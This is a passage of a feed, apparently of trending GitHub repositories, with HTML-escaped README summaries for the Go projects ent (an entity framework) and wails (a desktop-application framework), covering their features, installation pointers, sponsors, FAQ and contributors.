width=&#34;50%&#34; align=&#34;right&#34; style=&#34;display: block; margin:40px auto;&#34; src=&#34;https://s3.eu-central-1.amazonaws.com/entgo.io/assets/gopher_graph.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Simple, yet powerful entity framework for Go, that makes it easy to build and maintain applications with large data-models.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Schema As Code&lt;/strong&gt; - model any database schema as Go objects.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Easily Traverse Any Graph&lt;/strong&gt; - run queries, aggregations and traverse any graph structure easily.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Statically Typed And Explicit API&lt;/strong&gt; - 100% statically typed and explicit API using code generation.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Multi Storage Driver&lt;/strong&gt; - supports MySQL, MariaDB, TiDB, PostgreSQL, SQLite and Gremlin.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Extendable&lt;/strong&gt; - simple to extend and customize using Go templates.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Quick Installation&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;go install entgo.io/ent/cmd/ent@latest&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For proper installation using &lt;a href=&#34;https://github.com/golang/go/wiki/Modules#quick-start&#34;&gt;Go modules&lt;/a&gt;, visit &lt;a href=&#34;https://entgo.io/docs/code-gen/#version-compatibility-between-entc-and-ent&#34;&gt;entgo.io website&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Docs and Support&lt;/h2&gt; &#xA;&lt;p&gt;The documentation for developing and using ent is available at: &lt;a href=&#34;https://entgo.io&#34;&gt;https://entgo.io&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;For discussion and support, &lt;a href=&#34;https://github.com/ent/ent/issues/new/choose&#34;&gt;open an issue&lt;/a&gt; or join our &lt;a href=&#34;https://gophers.slack.com/archives/C01FMSQDT53&#34;&gt;channel&lt;/a&gt; in the gophers Slack.&lt;/p&gt; &#xA;&lt;h2&gt;Join the ent Community&lt;/h2&gt; &#xA;&lt;p&gt;Building &lt;code&gt;ent&lt;/code&gt; would not have been possible without the collective work of our entire community. We maintain a &lt;a href=&#34;https://raw.githubusercontent.com/ent/ent/master/doc/md/contributors.md&#34;&gt;contributors page&lt;/a&gt; which lists the contributors to this &lt;code&gt;ent&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;In order to contribute to &lt;code&gt;ent&lt;/code&gt;, see the &lt;a href=&#34;https://raw.githubusercontent.com/ent/ent/master/CONTRIBUTING.md&#34;&gt;CONTRIBUTING&lt;/a&gt; file for how to go get started. If your company or your product is using &lt;code&gt;ent&lt;/code&gt;, please let us know by adding yourself to the &lt;a href=&#34;https://github.com/ent/ent/wiki/ent-users&#34;&gt;ent users page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;For updates, follow us on Twitter at &lt;a href=&#34;https://twitter.com/entgo_io&#34;&gt;https://twitter.com/entgo_io&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;About the Project&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;code&gt;ent&lt;/code&gt; project was inspired by Ent, an entity framework we use internally. It is developed and maintained by &lt;a href=&#34;https://github.com/a8m&#34;&gt;a8m&lt;/a&gt; and &lt;a href=&#34;https://github.com/alexsn&#34;&gt;alexsn&lt;/a&gt; from the &lt;a href=&#34;https://connectivity.fb.com&#34;&gt;Facebook Connectivity&lt;/a&gt; team. It is used by multiple teams and projects in production, and the roadmap for its v1 release is described &lt;a href=&#34;https://github.com/ent/ent/issues/46&#34;&gt;here&lt;/a&gt;. Read more about the motivation of the project &lt;a href=&#34;https://entgo.io/blog/2019/10/03/introducing-ent&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;ent is licensed under Apache 2.0 as found in the &lt;a href=&#34;https://raw.githubusercontent.com/ent/ent/master/LICENSE&#34;&gt;LICENSE file&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>wailsapp/wails</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/wailsapp/wails</id>
    <link href="https://github.com/wailsapp/wails" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Create beautiful applications using Go&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34; style=&#34;text-align: center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/logo-universal.png&#34; width=&#34;55%&#34;&gt;&lt;br&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; Build desktop applications using Go &amp;amp; Web Technologies.&lt;br&gt;&lt;br&gt; &lt;a href=&#34;https://github.com/wailsapp/wails/raw/master/LICENSE&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/License-MIT-blue.svg?sanitize=true&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://goreportcard.com/report/github.com/wailsapp/wails&#34;&gt; &lt;img src=&#34;https://goreportcard.com/badge/github.com/wailsapp/wails&#34;&gt; &lt;/a&gt; &lt;a href=&#34;http://godoc.org/github.com/wailsapp/wails&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/godoc-reference-blue.svg?sanitize=true&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://www.codefactor.io/repository/github/wailsapp/wails&#34;&gt; &lt;img src=&#34;https://www.codefactor.io/repository/github/wailsapp/wails/badge&#34; alt=&#34;CodeFactor&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://github.com/wailsapp/wails/issues&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat&#34; alt=&#34;CodeFactor&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://app.fossa.io/projects/git%2Bgithub.com%2Fwailsapp%2Fwails?ref=badge_shield&#34; alt=&#34;FOSSA Status&#34;&gt; &lt;img src=&#34;https://app.fossa.io/api/projects/git%2Bgithub.com%2Fwailsapp%2Fwails.svg?type=shield&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://houndci.com&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/Reviewed_by-Hound-8E64B0.svg?sanitize=true&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://github.com/avelino/awesome-go&#34; rel=&#34;nofollow&#34;&gt; &lt;img src=&#34;https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg?sanitize=true&#34; alt=&#34;Awesome&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://github.com/wailsapp/wails/workflows/release/badge.svg?branch=master&#34; rel=&#34;nofollow&#34;&gt; &lt;img src=&#34;https://github.com/wailsapp/wails/workflows/release/badge.svg?branch=master&#34; alt=&#34;Release Pipelines&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;p&gt;&lt;span id=&#34;nav-1&#34;&gt;&lt;/span&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Internationalization&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/README.md&#34;&gt;English&lt;/a&gt; | &lt;a href=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/README.zh-Hans.md&#34;&gt;简体中文&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;span id=&#34;nav-2&#34;&gt;&lt;/span&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Click me to Open/Close the directory listing&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/#nav-1&#34;&gt;1. Internationalization&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/#nav-2&#34;&gt;2. Table of Contents&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/#nav-3&#34;&gt;3. Introduction&lt;/a&gt; &#xA;   &lt;ul&gt; &#xA;    &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/#nav-3-1&#34;&gt;3.1 Official Website&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/#nav-4&#34;&gt;4. Features&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/#nav-5&#34;&gt;5. Sponsors&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/#nav-6&#34;&gt;6. Installation&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/#nav-8&#34;&gt;7. FAQ&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/#nav-9&#34;&gt;8. Contributors&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/#nav-10&#34;&gt;9. Special Mentions&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/#nav-11&#34;&gt;10. Special Thanks&lt;/a&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;p&gt;&lt;span id=&#34;nav-3&#34;&gt;&lt;/span&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Introduction&lt;/h2&gt; &#xA;&lt;p&gt;The traditional method of providing web interfaces to Go programs is via a built-in web server. Wails offers a different approach: it provides the ability to wrap both Go code and a web frontend into a single binary. Tools are provided to make this easy for you by handling project creation, compilation and bundling. All you have to do is get creative!&lt;/p&gt; &#xA;&lt;p&gt;&lt;span id=&#34;nav-3-1&#34;&gt;&lt;/span&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;&lt;strong&gt;PLEASE NOTE: As we are approaching the v2 release, we are not accepting any new feature requests or bug reports for v1. If you have a critical issue, please open a ticket and state why it is critical.&lt;/strong&gt;&lt;/h3&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;Version 2&lt;/h3&gt; &#xA;&lt;p&gt;Wails v2 has been released in Beta for all 3 platforms. Check out the &lt;a href=&#34;https://wails.io&#34;&gt;new website&lt;/a&gt; if you are interested in trying it out.&lt;/p&gt; &#xA;&lt;h3&gt;Legacy v1 Website&lt;/h3&gt; &#xA;&lt;p&gt;The legacy v1 docs can be found at &lt;a href=&#34;https://wails.app&#34;&gt;https://wails.app&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;span id=&#34;nav-4&#34;&gt;&lt;/span&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Use standard Go for the backend&lt;/li&gt; &#xA; &lt;li&gt;Use any frontend technology you are already familiar with to build your UI&lt;/li&gt; &#xA; &lt;li&gt;Quickly create rich frontends for your Go programs using pre-built templates&lt;/li&gt; &#xA; &lt;li&gt;Easily call Go methods from Javascript&lt;/li&gt; &#xA; &lt;li&gt;Auto-generated Typescript definitions for your Go structs and methods&lt;/li&gt; &#xA; &lt;li&gt;Native Dialogs &amp;amp; Menus&lt;/li&gt; &#xA; &lt;li&gt;Supports modern translucency and &#34;frosted window&#34; effects&lt;/li&gt; &#xA; &lt;li&gt;Unified eventing system between Go and Javascript&lt;/li&gt; &#xA; &lt;li&gt;Powerful cli tool to quickly generate and build your projects&lt;/li&gt; &#xA; &lt;li&gt;Multiplatform&lt;/li&gt; &#xA; &lt;li&gt;Uses native rendering engines - &lt;em&gt;no embedded browser&lt;/em&gt;!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;span id=&#34;nav-5&#34;&gt;&lt;/span&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Sponsors&lt;/h2&gt; &#xA;&lt;p&gt;This project is supported by these kind people / companies:&lt;/p&gt; &#xA;&lt;a href=&#34;https://github.com/sponsors/leaanthony&#34; style=&#34;width:100px;&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/img/silver%20sponsor.png&#34; width=&#34;100&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/selvindev&#34; style=&#34;width:100px;&#34;&gt; &lt;img src=&#34;https://github.com/selvindev.png?size=100&#34; width=&#34;100&#34;&gt; &lt;/a&gt; &#xA;&lt;br&gt; &#xA;&lt;br&gt; &#xA;&lt;a href=&#34;https://github.com/sponsors/leaanthony&#34; style=&#34;width:100px;&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/img/bronze%20sponsor.png&#34; width=&#34;100&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/snider&#34; style=&#34;width:100px;&#34;&gt; &lt;img src=&#34;https://github.com/snider.png?size=100&#34; width=&#34;100&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/codydbentley&#34; style=&#34;width:100px&#34;&gt; &lt;img src=&#34;https://github.com/codydbentley.png?size=100&#34; width=&#34;100&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://www.easywebadv.it/&#34; style=&#34;width:100px&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/website/static/img/easyweb.png&#34; width=&#34;100&#34;&gt; &lt;/a&gt; &#xA;&lt;br&gt; &#xA;&lt;br&gt; &#xA;&lt;a href=&#34;https://github.com/matryer&#34; style=&#34;width:100px&#34;&gt; &lt;img src=&#34;https://github.com/matryer.png&#34; width=&#34;100&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://www.jetbrains.com?from=Wails&#34; style=&#34;width:100px&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/assets/images/jetbrains-grayscale.png&#34; width=&#34;100&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/tc-hib&#34; style=&#34;width:55px&#34;&gt; &lt;img src=&#34;https://github.com/tc-hib.png?size=55&#34; width=&#34;55&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/picatz&#34; style=&#34;width:50px&#34;&gt; &lt;img src=&#34;https://github.com/picatz.png?size=50&#34; width=&#34;50&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/tylertravisty&#34; style=&#34;width:50px&#34;&gt; &lt;img src=&#34;https://github.com/tylertravisty.png?size=50&#34; width=&#34;50&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/akhudek&#34; style=&#34;width:50px&#34;&gt; &lt;img src=&#34;https://github.com/akhudek.png?size=50&#34; width=&#34;50&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/trea&#34; style=&#34;width:50px&#34;&gt; &lt;img src=&#34;https://github.com/trea.png?size=50&#34; width=&#34;50&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/LanguageAgnostic&#34; style=&#34;width:55px&#34;&gt; &lt;img src=&#34;https://github.com/LanguageAgnostic.png?size=55&#34; width=&#34;55&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/fcjr&#34; style=&#34;width:55px&#34;&gt; &lt;img src=&#34;https://github.com/fcjr.png?size=55&#34; width=&#34;55&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/nickarellano&#34; style=&#34;width:60px&#34;&gt; &lt;img src=&#34;https://github.com/nickarellano.png?size=60&#34; width=&#34;60&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/bglw&#34; style=&#34;width:65px&#34;&gt; &lt;img src=&#34;https://github.com/bglw.png?size=65&#34; width=&#34;65&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/jugglingjsons&#34; style=&#34;width:50px&#34;&gt; &lt;img src=&#34;https://github.com/jugglingjsons.png?size=50&#34; width=&#34;50&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/marcus-crane&#34; style=&#34;width:65px&#34;&gt; &lt;img src=&#34;https://github.com/marcus-crane.png?size=65&#34; width=&#34;65&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/bbergshaven&#34; style=&#34;width:45px&#34;&gt; &lt;img src=&#34;https://github.com/bbergshaven.png?size=45&#34; width=&#34;45&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/Gilgames000&#34; style=&#34;width:45px&#34;&gt; &lt;img src=&#34;https://github.com/Gilgames000.png?size=45&#34; width=&#34;45&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/ilgityildirim&#34; style=&#34;width:50px&#34;&gt; &lt;img src=&#34;https://github.com/ilgityildirim.png?size=50&#34; width=&#34;50&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/questrail&#34; style=&#34;width:50px&#34;&gt; &lt;img src=&#34;https://github.com/questrail.png?size=50&#34; width=&#34;50&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/DonTomato&#34; style=&#34;width:45px&#34;&gt; &lt;img src=&#34;https://github.com/DonTomato.png?size=45&#34; width=&#34;45&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/taigrr&#34; style=&#34;width:55px&#34;&gt; &lt;img src=&#34;https://github.com/taigrr.png?size=55&#34; width=&#34;55&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/charlie-dee&#34; style=&#34;width:55px&#34;&gt; &lt;img src=&#34;https://github.com/charlie-dee.png?size=55&#34; width=&#34;55&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/EdenNetworkItalia&#34; style=&#34;width:65px&#34;&gt; &lt;img src=&#34;https://github.com/EdenNetworkItalia.png?size=65&#34; width=&#34;65&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/michaelolson1996&#34; style=&#34;width:55px&#34;&gt; &lt;img src=&#34;https://github.com/michaelolson1996.png?size=55&#34; width=&#34;55&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/GargantuaX&#34; style=&#34;width:45px&#34;&gt; &lt;img src=&#34;https://github.com/GargantuaX.png?size=45&#34; width=&#34;45&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://github.com/brodyover&#34; style=&#34;width:45px&#34;&gt; &lt;img src=&#34;https://github.com/brodyover.png?size=45&#34; width=&#34;45&#34;&gt; &lt;/a&gt; &#xA;&lt;p&gt;&lt;span id=&#34;nav-6&#34;&gt;&lt;/span&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;The installation instructions are on the &lt;a href=&#34;https://wails.io/docs/gettingstarted/installation&#34;&gt;official website&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;span id=&#34;nav-8&#34;&gt;&lt;/span&gt;&lt;/p&gt; &#xA;&lt;h2&gt;FAQ&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Is this an alternative to Electron?&lt;/p&gt; &lt;p&gt;Depends on your requirements. It&#39;s designed to make it easy for Go programmers to make lightweight desktop applications or add a frontend to their existing applications. Whilst Wails does not currently offer hooks into native elements such as menus, this may change in the future.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Who is this project aimed at?&lt;/p&gt; &lt;p&gt;Go programmers who want to bundle an HTML/JS/CSS frontend with their applications, without resorting to creating a server and opening a browser to view it.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;What&#39;s with the name?&lt;/p&gt; &lt;p&gt;When I saw WebView, I thought &#34;What I really want is tooling around building a WebView app, a bit like Rails is to Ruby&#34;. So initially it was a play on words (Webview on Rails). It just so happened to also be a homophone of the English name for the &lt;a href=&#34;https://en.wikipedia.org/wiki/Wales&#34;&gt;Country&lt;/a&gt; I am from. So it stuck.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;span id=&#34;nav-9&#34;&gt;&lt;/span&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Contributors&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/qaisjp&#34;&gt;&lt;img src=&#34;https://github.com/qaisjp.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/alee792&#34;&gt;&lt;img src=&#34;https://github.com/alee792.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/lanzafame&#34;&gt;&lt;img src=&#34;https://github.com/lanzafame.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/mattn&#34;&gt;&lt;img src=&#34;https://github.com/mattn.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/0xflotus&#34;&gt;&lt;img src=&#34;https://github.com/0xflotus.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/mdhender&#34;&gt;&lt;img src=&#34;https://github.com/mdhender.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/fishfishfish2104&#34;&gt;&lt;img src=&#34;https://github.com/fishfishfish2104.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/intelwalk&#34;&gt;&lt;img src=&#34;https://github.com/intelwalk.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/ocelotsloth&#34;&gt;&lt;img src=&#34;https://github.com/ocelotsloth.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/bh90210&#34;&gt;&lt;img src=&#34;https://github.com/bh90210.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/iceleo-com&#34;&gt;&lt;img src=&#34;https://github.com/iceleo-com.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/fallendusk&#34;&gt;&lt;img src=&#34;https://github.com/fallendusk.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Chronophylos&#34;&gt;&lt;img src=&#34;https://github.com/Chronophylos.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Vaelatern&#34;&gt;&lt;img src=&#34;https://github.com/Vaelatern.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/mewmew&#34;&gt;&lt;img src=&#34;https://github.com/mewmew.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/kraney&#34;&gt;&lt;img src=&#34;https://github.com/kraney.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/JackMordaunt&#34;&gt;&lt;img src=&#34;https://github.com/JackMordaunt.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/MichaelHipp&#34;&gt;&lt;img src=&#34;https://github.com/MichaelHipp.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/tmclane&#34;&gt;&lt;img src=&#34;https://github.com/tmclane.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Rested&#34;&gt;&lt;img src=&#34;https://github.com/Rested.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Jarek-SRT&#34;&gt;&lt;img src=&#34;https://github.com/Jarek-SRT.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/konez2k&#34;&gt;&lt;img src=&#34;https://github.com/konez2k.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/sayuthisobri&#34;&gt;&lt;img src=&#34;https://github.com/sayuthisobri.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/dedo1911&#34;&gt;&lt;img src=&#34;https://github.com/dedo1911.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/fdidron&#34;&gt;&lt;img src=&#34;https://github.com/fdidron.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Splode&#34;&gt;&lt;img src=&#34;https://github.com/Splode.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Lyimmi&#34;&gt;&lt;img src=&#34;https://github.com/Lyimmi.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Unix4ever&#34;&gt;&lt;img src=&#34;https://github.com/Unix4ever.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/timkippdev&#34;&gt;&lt;img src=&#34;https://github.com/timkippdev.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/kyoto44&#34;&gt;&lt;img src=&#34;https://github.com/kyoto44.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/artooro&#34;&gt;&lt;img src=&#34;https://github.com/artooro.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/ilgityildirim&#34;&gt;&lt;img src=&#34;https://github.com/ilgityildirim.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/gelleson&#34;&gt;&lt;img src=&#34;https://github.com/gelleson.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/kmuchmore&#34;&gt;&lt;img src=&#34;https://github.com/kmuchmore.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/aayush420&#34;&gt;&lt;img src=&#34;https://github.com/aayush420.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Rezrazi&#34;&gt;&lt;img src=&#34;https://github.com/Rezrazi.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/misitebao&#34;&gt;&lt;img src=&#34;https://github.com/misitebao.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/DrunkenPoney&#34;&gt;&lt;img src=&#34;https://github.com/DrunkenPoney.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/SophieAu&#34;&gt;&lt;img src=&#34;https://github.com/SophieAu.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/alexmat&#34;&gt;&lt;img src=&#34;https://github.com/alexmat.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/RH12503&#34;&gt;&lt;img src=&#34;https://github.com/RH12503.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/hi019&#34;&gt;&lt;img src=&#34;https://github.com/hi019.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Igogrek&#34;&gt;&lt;img src=&#34;https://github.com/Igogrek.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/aschey&#34;&gt;&lt;img src=&#34;https://github.com/aschey.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/akhudek&#34;&gt;&lt;img src=&#34;https://github.com/akhudek.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/s12chung&#34;&gt;&lt;img src=&#34;https://github.com/s12chung.png?size=40&#34; width=&#34;40&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;span id=&#34;nav-10&#34;&gt;&lt;/span&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Special Mentions&lt;/h2&gt; &#xA;&lt;p&gt;Without the following people, this project would never have existed:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://wiki.ubuntu.com/bashfulrobot&#34;&gt;Dustin Krysak&lt;/a&gt; - His support and feedback has been immense. More patience than you can throw a stick at (Not long now Dustin!).&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/zserge&#34;&gt;Serge Zaitsev&lt;/a&gt; - Creator of &lt;a 